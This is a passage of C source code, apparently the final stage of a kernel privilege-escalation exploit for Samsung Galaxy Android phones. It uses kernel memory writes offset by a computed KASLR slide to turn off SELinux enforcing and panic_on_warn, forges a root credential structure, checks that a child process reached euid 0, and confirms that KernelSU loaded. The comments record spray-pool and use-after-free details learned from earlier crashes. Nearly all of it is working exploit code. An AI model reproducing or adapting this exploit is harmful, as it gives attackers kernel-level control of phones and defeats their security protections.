         * only park when no plant ever computed a slide. */
        if (!g_slide_set)
            park_forever("no KASLR slide");
        logf("[+] fake cred=%#llx selinux_state=%#llx\n", fc.A,
             SELINUX_STATE_STATIC + g_slide);
        /*
         * The zero plant writes 8 bytes at once.  selinux_state is
         * { enforcing(0), checkreqprot(1), initialized(2), policycap[](3..) }
         * (verified in our vmlinux: security_sid_to_context_core reads the
         * byte at +2 with TBNZ bit 0).  Writing at +0 would clear
         * "initialized" too, and the kernel then treats every SID as
         * "before initial load_policy": getpeercon() fails with EINVAL, all
         * property sets get PROP_ERROR_PERMISSION_DENIED, system_server
         * dies on its next property set and the softdog eventually panics
         * the phone -- exactly the crash loop of the first three app runs.
         *
         * Instead aim the 8-byte zero at selinux_state-7 (same as the shell
         * mode): the window covers the tail bytes of the idle
         * avc_latest_notif_update.notif_lock at -8 (4-byte qspinlock +
         * padding -- zeroing is a no-op while uncontended), plus padding,
         * plus enforcing itself.  initialized stays 1.
         */
        if (stage_write(SELINUX_ENFORCE_ZAP + g_slide, 0,
                        "selinux", raw, NULL, 0))
            park_forever("selinux write failed");
        if (read_panic_on_warn() != 0 &&
            stage_write(PANIC_ON_WARN_STATIC, 0,
                        "panic_on_warn", raw, NULL, 0))
            park_forever("panic_on_warn write failed");
        /*
         * DIAGNOSTIC: keep uid 2000 instead of 0.  If the child survives
         * the wake now, the killer targets uid==0 specifically (DEFEX/KDP
         * credential check); if it still dies, the cause is elsewhere
         * (page lifetime / refcount / context).
         */
        if (stage_write(fc.A + CRED_UID_OFF, 0, "fake_uid", raw, NULL, 0))
            park_forever("fake uid fix failed");
        if (stage_write(fc.A + 0x14, 0, "fake_euid", raw, NULL, 0))
            park_forever("fake euid fix failed");
        /*
         * suid/sgid sit at +0xC and land on the node's target field
         * (sgid = garbage low bits of &task->cred).  Zero them too so no
         * forged-cred process ever carries a junk gid anywhere.
         */
        if (stage_write(fc.A + 0xC, 0, "fake_suid", raw, NULL, 0))
            park_forever("fake suid fix failed");
    }
    logf("[+] cred writes landed, waking child\n");

    if (write(go_fd, "A", 1) != 1)
        logf("[!] child wake write failed\n");
    close(go_fd);

    {
        struct child_report rep;
        struct pollfd pf = {.fd = st_fd, .events = POLLIN};
        ssize_t rn = -1;

        if (poll(&pf, 1, 10000) > 0)
            rn = read(st_fd, &rep, sizeof(rep));
        close(st_fd);
        if (rn == (ssize_t)sizeof(rep) && rep.magic == CHILD_MAGIC)
        {
            logf("[+] child report uid=%d euid=%d setuid(0)=%d errno=%d resuid=%d/%d/%d\n",
                 rep.uid, rep.euid, rep.setuid_ret, rep.setuid_errno,
                 rep.ruid, rep.reuid, rep.rsuid);
            if (rep.setuid_ret != 0 || rep.reuid != 0)
                logf("[!] child did not reach euid 0\n");
        }
        else
        {
            logf("[!] child report missing (n=%zd)\n", rn);
        }
    }

    {
        int st = 0;

        if (waitpid(C, &st, 0) == C)
            logf("[+] child exit status=%#x\n", st);
    }
    /* The child is gone; nothing references the fake cred page anymore. */
    g_cred_live = 0;
    if (g_fake_stage)
    {
        /*
         * Authoritative success check (RootMyGalaxy verify_kernelsu_control)
         * replaces the script-side /proc/modules grep: the module can be
         * listed yet broken, and only the driver ioctl proves the control
         * path works.  The app greps stdout for KSU_LOADED.
         */
        if (verify_ksu_control() == 0)
            logf("KSU_LOADED\n");
        else
            logf("KSU_MISSING\n");
        /*
         * KSU is loaded by now and su(0) goes through the KSU path, so the
         * fake cred page is no longer required.  Drain the fake pool to
         * release the ~2GB of queued skb data -- a holder parking on that
         * starves kernel threads and the softdog panics ~100s later
         * (verified twice in kmsg).
         *
         * Exiting is only safe when no failed-plant zombies are held.
         * This process's death reparents them to init, which reaps them,
         * and release_task() then runs cleanup_timerqueue() on their
         * stale nodes -- nodes that live in pages the drain just freed
         * and the allocator handed to whoever came next.  That UAF write
         * corrupted arbitrary kernel data on the first app run (mass app
         * kills, damaged on-disk app file metadata, panic).  With
         * zombies held, park instead: the pools are drained by then, so
         * parking is cheap and the phone stays responsive.
         */
        /*
         * Only free the spray pool once the script confirmed that nothing
         * survives holding the forged cred: the cred is a node in one of
         * these pages, and a dangling cred in a live process corrupts
         * kernel memory the moment it is touched (su handling, or
         * exit_creds when init's cleanup kills the holder).
         */
        {
            char ok[16] = {0};
            int cfd = open("/data/local/tmp/samtimer/cleanup.ok", O_RDONLY);

            if (cfd >= 0)
            {
                (void)!read(cfd, ok, sizeof(ok) - 1);
                close(cfd);
            }
            if (strncmp(ok, "done", 4))
            {
                logf("[!] cleanup not confirmed (\"%s\") -- keeping the "
                     "spray pool alive; park\n",
                     ok);
                g_cred_live = 1;
                logf("PARKED_AFTER_SUCCESS\n");
                park_forever("cred holder may remain; holding spray pool");
            }
        }
        drain_spray(1);
        logf("[+] fake pool drained; KSU holds root now\n");
        if (g_held)
        {
            logf("[!] %d failed-plant zombie(s) held; this process stays "
                 "alive as the holder\n",
                 g_held);
            logf("PARKED_AFTER_SUCCESS\n");
            park_forever("fake stage done; zombie holder until reboot");
        }
        logf("[+] done (reboot reverts to stock; rerun to re-root)\n");
        return 0;
    }
    if (g_held)
        park_forever("root shell finished; failed-plant zombies are held");
    logf("[+] done\n");
    return 0;
}
